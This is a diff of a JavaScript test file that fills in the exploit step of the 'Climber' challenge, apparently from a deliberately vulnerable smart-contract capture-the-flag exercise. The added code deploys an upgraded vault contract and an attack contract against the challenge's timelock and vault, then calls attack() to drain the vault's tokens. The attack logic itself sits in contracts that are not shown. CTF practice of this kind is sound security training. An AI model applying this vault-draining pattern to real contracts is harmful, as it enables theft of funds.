@@ -53,6 +53,24 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        //deploy the upgraded vault implementation
+        let upgradedVaultFactory = await ethers.getContractFactory('UpgradedVaultAttack', attacker)
+        let upgradedVault = await upgradedVaultFactory.deploy();
+
+        //deploy the attack contract
+        let attackFactory = await ethers.getContractFactory('ClimberAttack', attacker)
+        
+        let attackContract = await attackFactory.deploy(
+            this.timelock.address,
+            this.vault.address,
+            upgradedVault.address,
+            this.token.address,
+            attacker.address 
+        )
+        
+        //drain the tokens from the vault!
+        await attackContract.attack();
+
     });
 
     after(async function () {
